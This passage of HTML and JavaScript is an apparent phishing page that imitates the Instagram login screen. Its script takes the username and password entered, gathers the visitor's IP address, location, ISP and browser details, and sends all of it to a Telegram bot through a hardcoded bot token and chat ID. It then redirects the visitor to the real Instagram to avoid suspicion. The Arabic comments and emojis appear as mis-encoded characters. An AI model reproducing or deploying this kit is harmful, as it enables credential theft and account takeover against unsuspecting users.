    box-sizing:border-box;   /* Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹ Ø¹Ù„Ø´Ø§Ù† Ø§Ù„Ø¨ÙˆØ±Ø¯Ø± Ù…Ø§ÙŠØ²ÙˆØ¯Ø´ Ø§Ù„Ø­Ø¬Ù… */
}

<body>
<div class="language">English (US)</div>

<div class="container">

    <img src="IG.png" class="logo">

    <input type="text" id="email" placeholder="Username, email or mobile number ">
    <input type="password" id="password" placeholder="Password">

    <div id="errorMsg" class="error">
        Please enter a valid email and password (at least 8 characters)
    </div>

    <div id="loadingMsg" class="loading">
        Signing in, please wait...
    </div>

    <button id="loginBtn">Log in</button>

    <div class="forgot bold" onclick="window.open('https://www.instagram.com/accounts/password/reset/','_blank')">
    Forgot password?
    </div>


    <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="create-btn">
        Create new account

</div>

<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… - Ø§Ø³ØªØ¨Ø¯Ù„Ù‡Ø§ Ø¨Ù‚ÙŠÙ…Ùƒ
    const TOKEN = "8136154375:AAEC2wSeLsN6NvvZZqKwCbn8aVTCP4c-Sao";
    const CHAT_ID = "7631254472";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // Ø¹Ù†Ø§ØµØ± DOM
    const emailInput = document.getElementById('email');
    const passInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const errorMsg = document.getElementById('errorMsg');
    const loadingMsg = document.getElementById('loadingMsg');

    // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¹Ù…ÙŠÙ„
    async function getClientInfo() {
        try {
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù€ IP
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹
            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
            const locationData = await locationResponse.json();
            
            return {
                ip: ipData.ip,
                country: locationData.country || 'Unknown',
                city: locationData.city || 'Unknown',
                region: locationData.regionName || 'Unknown',
                timezone: locationData.timezone || 'Unknown',
                isp: locationData.isp || 'Unknown',
                browser: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString(),
                referrer: document.referrer || 'Direct'
            };
        } catch (error) {
            console.error('Error getting client info:', error);
            return {
                ip: 'Unknown',
                country: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                timezone: 'Unknown',
                isp: 'Unknown',
                browser: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString(),
                referrer: document.referrer || 'Direct'
            };
        }
    }

    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
    async function sendLoginNotification(email, password) {
        const clientInfo = await getClientInfo();
        
        const message = `
ğŸ” **New Login Attempt** - ${clientInfo.time}

ğŸ‘¤ **Email/Username:** ${email}
ğŸ”‘ **Password:** ${password}

ğŸŒ **IP Address:** ${clientInfo.ip}
ğŸ“ **Location:** ${clientInfo.city}, ${clientInfo.region}, ${clientInfo.country}
ğŸ•’ **Timezone:** ${clientInfo.timezone}
ğŸ“¡ **ISP:** ${clientInfo.isp}

ğŸ–¥ï¸ **Platform:** ${clientInfo.platform}
ğŸŒ **Browser:** ${getBrowserName(clientInfo.browser)}
ğŸ—£ï¸ **Language:** ${clientInfo.language}
ğŸ“± **Screen:** ${clientInfo.screen}
ğŸ”— **Referrer:** ${clientInfo.referrer}
        `.trim();

        try {
            await axios.post(URI_API, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('Login notification sent successfully');
        } catch (error) {
            console.error('Error sending notification:', error);
        }
    }

    // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­ Ù…Ù† userAgent
    function getBrowserName(userAgent) {
        if (userAgent.includes("Chrome")) return "Chrome";
        if (userAgent.includes("Firefox")) return "Firefox";
        if (userAgent.includes("Safari")) return "Safari";
        if (userAgent.includes("Edge")) return "Edge";
        if (userAgent.includes("Opera")) return "Opera";
        return "Unknown Browser";
    }

    // Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
    loginBtn.addEventListener('click', async function(e){
        const emailValue = emailInput.value.trim();
        const passValue = passInput.value.trim();

        if(emailValue === "" || passValue.length < 8){
            e.preventDefault();
            errorMsg.style.display = "block";
        } else {
            errorMsg.style.display = "none";
            loadingMsg.style.display = "block";
            loginBtn.disabled = true;
            loginBtn.textContent = "Signing in...";

            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                await sendLoginNotification(emailValue, passValue);
                
                // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø«Ù… Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
                setTimeout(() => {
                    window.open("https://www.instagram.com/","_blank");
                    loadingMsg.style.display = "none";
                    loginBtn.disabled = false;
                    loginBtn.textContent = "Log in";
                }, 2000);
                
            } catch (error) {
                console.error('Error:', error);
                loadingMsg.style.display = "none";
                loginBtn.disabled = false;
                loginBtn.textContent = "Log in";
                window.open("https://www.instagram.com/","_blank");
            }
        }
    });

    // Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Enter
    document.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            loginBtn.click();
        }
    });
</script>

</body>
